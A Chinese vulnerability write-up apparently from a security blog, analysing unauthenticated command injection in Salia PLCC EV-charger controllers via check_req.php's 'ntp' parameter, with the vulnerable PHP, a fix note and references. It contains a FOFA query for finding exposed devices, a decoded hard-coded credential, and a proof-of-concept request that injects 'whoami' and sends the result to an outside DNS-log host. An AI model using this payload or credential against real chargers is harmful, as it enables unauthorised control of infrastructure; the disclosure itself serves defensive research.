---
title: "Salia PLCC check_req.php 命令执行漏洞"
source: https://mrxn.net/jswz/salia-check_req-ntp-rce.html
asset_dir: assets/salia-plcc-check_req.php-命令执行漏洞
---

# Salia PLCC check\_req.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/22 08:19
* 972浏览
* [0评论](#comment)
* 22分钟阅读

深入探索

Authorization

授权

脚本语言


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Salia PLCC 的 eCHARGE 系列提供适用于家庭、企业和公共场所的智能电动汽车充电解决方案，具备高效充电、动态负载管理和光伏系统集成等功能的充电站。其充电管理系统 `check_req.php` 存在命令执行[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，未授权攻击者可利用该漏洞在设备上[执行任意系统命令](https://mrxn.net/tag/rce)。

# 影响版本

<2.0.4 版本

漏洞修复方案

# fofa语法

> `"Salia PLCC"`

# 漏洞分析

看下 `check_req.php` 的业务逻辑实现，如下

深入探索

Web安全课程

网络安全课程

物流软件安全

```
<?php
    //sleep(2);

    $final = array();
    $final["status"] = "pending";

    $x = $_GET;
    if (array_key_exists("ntp", $x)) {
       $cmd = '/srv/salia/nwcheck -ntpx='.$x['ntp'];
       exec($cmd, $output, $result_code);
       $final["result"] = $output;
       $final["code"] = $result_code;
       if ($result_code==0) { $final["result"] = "Ok"; }
       else {
          $cmd2 = '/srv/salia/nwcheck -ntp='.$x['ntp'];
          exec($cmd2, $output2, $result_code2);
          $final["result"] = $output2;
       }
       $final["status"] = "ok";
    }
    if (array_key_exists("portal", $x)) {
       $url = 'https://saliaportal.echarge.de/reachable.php';
       $qry = array();
       $data = http_build_query($qry);
       $opts = array(
             'http' => array(
                   'method'  => 'GET',
                   'header'  => "Content-type: application/x-www-form-urlencoded\r\n".
                             "Authorization: Basic c2FsaWE6eDlUZzI3JDNfJTQ0bkJkP2dG\n",
                   'timeout' => 4
             ),
             'ssl' => array(
                   'verify_peer' => false,
                   'verify_peer_name' => false
             )
       );
       $context = stream_context_create($opts);
       $ret = file_get_contents($url, false, $context);
       $final["result"] = $ret;
       $final["code"] = 0;
       $final["status"] = "ok";
    }

    echo json_encode($final);
    // TODO -> return state of nwcheck ...

?>
```

深入探索

计算机安全

编码转换工具

安全认证考试

在处理`ntp`参数时，用户输入直接拼接到系统命令中，未经过滤或转义。攻击者可通过构造恶意参数[执行任意系统命令](https://mrxn.net/tag/rce)。

污点参数传递路径如下

网络安全

```
$_GET['ntp']` → `$cmd = '/srv/salia/nwcheck -ntpx='.$x['ntp'];` → `exec($cmd, ...)
```

其中还存在一个默认硬编码凭证

```
c2FsaWE6eDlUZzI3JDNfJTQ0bkJkP2dG` ==> `salia:x9Tg27$3_%44nBd?gF
```

修复版本(2.2.0)增加了 `escapeshellarg` 函数进行过滤

[![Salia PLCC check_req.php 命令执行漏洞](images/img-001-fa4e25a6bdd8.webp)](https://image.mrxn.net/c17b9704cfbe41af9a5ecd36d012d20b.webp)

# 漏洞复现

```
GET /check_req.php?ntp=127.0.0.1;curl+`whoami`.dnslog.pt HTTP/1.1
Host: salia.mrxn.net
```

成功获得 `whoami` 命令执行结果

漏洞修复方案

[![Salia PLCC check_req.php 命令执行漏洞](images/img-002-7a037556289a.webp)](https://image.mrxn.net/d3eb2e0da6044182aee6d85e6ef1bed1.webp)

# 参考

* `https://www.onekey.com/resource/critical-vulnerabilities-in-ev-charging-stations-analysis-of-echarge-controllers`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[Salia PLCC check\_req.php 命令执行漏洞](https://mrxn.net/jswz/salia-check_req-ntp-rce.html)  
文章链接：<https://mrxn.net/jswz/salia-check_req-ntp-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/salia-check\_req-ntp-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKZ0lEQVR4Aeybi3ojtw6D8/f937nHMAuRlujxOBvHPq32CxcUCGIU0crF2/719fX195/G3//8sc8/yxtwTXhTmBaqz2FJ5c1VdL1yzl3r0Jp76J57dfHW/ClqIBeP/fEpJzAGcpny1zPRfQLurzXgC7jxdh2iBon2EFp3FtWjgPSbe1WfY9ZoDelhvXgHRN3ritafxdo7BlLJnb/vBJaBQEweejzaKkRP1fhVAlEDRtm1iqN4ScwDyy2D4GDFS+vyYa9agOitXJfDOd3cC9EHPc56rZeBiNzxvhPYA3nf2bdP/tGBdF8W/FTXhOY6hPV6dzr5KGpNa0Xl4Nav1rocQi+fOSBqQNf6I9yPDuRHdvQfN/nRgQDXb75wjGfP/OgVCvGMqoHgqn+tK4fQAFW25MDyuSyiFxA/OpCxv518+wT2QL59dK9pXAaia30UR9vo+jo93P9yUD0gdPaoNXMdntV1veaqR5dbd4RdX+W63mUgnWhzv3cCYyAQr0Y4h90WIXq7WvfKqBzc77UfhAbyvTE45ube+kzXHiHEMx7pXIfQwzl0n3AMRIsd7z+BPZD3z+BmB3/VK/zd/MbxsoC8qva80MsHPKdbDC6E/YUQfsodENxF+u2P2QvyS6ZNrflT3DfEJ/oh+PRAIF5xkOjPpXt1uAapf1Znj9oH6QeRu269cOYgtIDKS1gPjN/ULXJNaM4Iqx6e554eiDfwBvxPPHIMBHKaEHl3Anp1zAGhh8DaB/c5iBok1l7nfp7XQnMVIXxUd0BwVed81gCmHv6Ts4XA9SbZUwjBWVNRdYd5r4VjIC5ufO8J7IG89/yXpy8D0bVxQFw9SLQDrFxXs1dF6x4h5DOAGzlw/VJxQ75oAfGs+jnALQexBsYuqn6QJQGWz2EZSNHv9A0n8BfElDzNuoeOc9014cx5LYTwh0TxCvXOIX4Oa2D1gJWb+7WG0Cl32NdrIdzXQdQASa8BXF/l9hJeC9NfELqJXpb7hixH8l5iD+S95788fbyXBXGlYEVdQwes9cW1IdxfsZEdUrW3y90MuUfrupo5a4TmOlT9XsD9Z8rLfcod5iB79w3x6XwIHn5T9x4hJ2jO0xWaM4qbwzUhpB/c5rVPWgWERvl3o/o6P/KCeCYkHulrDbIHbvOq6/J9Q7pTeSO3B/LGw+8evQzE1/kRQl5FayG4+iBYOeurzjmEHtZ/BIKsWV+x84XosQ5iDYmuCTuPjoPsh9yrtPJRKJ9D/BxVswxkFu/1757A0wOBeGXUqc5bhtAAowRcf6OFxFG8JPa7pOMDQjuIJoHQAE01KeD6fD9H6CpEDTB18/Y7cO0dxQeJvBUQfcDoAK5eQMs9PZDhspOXnMAeyEuO9fumy2/q1QoY1wsi11VUQKwhUfwc1c/5rNEawkf5mei8YPWYdV5XrM+D8IBE17ueyjmH6HWf0LWKELrK7RtST+Pn8m87jYFoigqIqQHDVLzDpNdCc8D1Rnn9CCH0kD821h6IeuWcw1rTXhQQNeh97WGE1JuTj8McrLqjGqQeIren0L0Vx0AqufP3ncDhQDRFRd0exKQhsdbP5BC9j7R6tuJIB+EFiepxHPV2NfdB+kHkR/quVrnO11zVHQ6kCnf+OyewB/I753z6KePtd3f4GgnNdai6w/V5Ld5cRfFzQHxZgBWthaxVvzmH1Ln3CGs/RG/lutx+EHqvhdYrd0DoXBPCyu0b4hP7EDz8xfBojxDTBRYZcP3xF1hqIvTqUCifQ/wcwNWv8hAcrFg94bZea/Z7xEF4VB0EZ4+K1lXOOUQf9D+S7xvi0/sQ3AP5kEF4G4cDgbxeELmvXocQGpvfQwhd9ei0cKvrNJ1H5eYcwhMYdsD1SyIkjuIlsQdkfeYusvEBqYPb3H3C0VCSw4EU3U5/6QRODUTTdHhfcDt5yG9S1go7vbmK0iogfWv9mRzSA27zsz5w2we3nx9EvfPT56GoNa0VEH1ALY/81ECGeicvP4E9kJcf8XMPWH5TB8Y3OF0xRWcpfg7rID0gctcqQtSASi85cN1TLfjZ3+HcA+Frr3s46wFT49/egeseIXGILgkEX59xoa8fEDXga9+Qr8/6M35T77YFMbmjGjDKwPVV0r0KhqgkZ3VugfAHTLXY+VZuzoHrviGxGs96rWt9zlVXzPy8hnhe5fcNqafxAfkYiCaqOLsnaR1ne2YdxCsEEqtm9vdaCNkDt3n1eDaXtwLS0x6QnDQK1ypC6CrX5epX1NoYSCVfm2/3oxPYAzk6nTfUlh97dYUc3X4griMkzjrImr0qWn+Ws77DzqPTQe4JIu905jrfysFzHu61f0XXhPuG1JP5gHz82AvrxDUxRbdP8Q6IXq87feWOdBBeQG1Z8s7DHDB+jF0aCwGhK1SbQugg0c/qGroaZC/c5tVj35B6Gh+Q74F8wBDqFsY3dV8zuL1OcLt2MyRvzmgvIYTONSEEB4niFepxaH0vIHshcmvdL4T7tSM9RB/k2+7WV4TQ6VkOCK7qzub7hpw9qV/SjYFATNVTFnoPyo/COggPr++hve7V7/EQ/sCQ2EtoEjj1TV09CvcJtZ4Dwq/ycMupdw4IDTCXrmv7AWO/YyBXxf/xX/+Wre+BfNgkDwfiK9XtGfKaWWeEtQbJdX7mIHUQuWtn0fsQuke5wmshhD8kildAcupTiJ8DQjfzWqvnKKSZ43Ags3ivX38CYyCeJMTEIbHbhvXCuS7OAeHjtdB65X8aEP7Qo5/VYfds62oNVu9ZB6lxrzVCiLpyB6zcGIhFG997Ansg7z3/5emnBgJxtaDHxfUBAeFTZRAcJNa6crhfU72L+csHrB5wzM0e9TkQvR0HUYP8bR+Sc4/9hacG4saNrz+B8fa7H6UpPRvuhZw+RO5ahxAayFdQ1UHUzdV9QdQqZ11FCJ25qofbmjSwcuLvRfWb83s95q33WrhviE7hbvx+YbzbC/HKgOfR2/bEK7oG6WuuIkS9cs5hrfkZEDXIW+ZaRUgdRG7/iu6p3JkcwhNo5cD1/aq2WMh9Q8phfEK6B/IJUyh7GAPxVT2LxWOkENcSEjs/N9SauQ6tqzWIZzzial25vYRaK5Q7tJ4D1mfNGvcL51pdq+4wD+EP7P/Y+uvD/owb4n1BTgvW3LoO58lXDaTXka72zDmc84DUQeTdM81BaCCxPtu6yjmH7IHb3JpHaH/hMpBHzbv+2hPYA3nt+T7t/pKB6Oo5IK6x10IIDhLFK+pnoLUCQqfcAcF1emsqVp1zWD1cqwirrnrPuXtnXmsIL+jxJQPxhjb2J3DEvmQgkNPvHq5XyhwQPUd6CA3QyQYHXH8rhkQXITnvwbWKrgkrP+eQfhC5NRBrwNT4fxKrr3LHSwYynr6Tp09gD+TpI3ttwzIQX517+Ox27APc/TJSPa0XQvS4Ls7xLAfh5X4hrJx9O1SPw3WvO7RGCPEsSHQPJLcMRM073ncCYyCQU4LH+dGWPXlhpxOvqDWtFY+4Wp9zWPd9pNHzFFWjtQLSS2tF1TmH1MFtbs0jlLdjDORR067/zgnsgfzOOZ9+yv8AAAD//yZxHCAAAAAGSURBVAMAbg64id992WAAAAAASUVORK5CYII=)

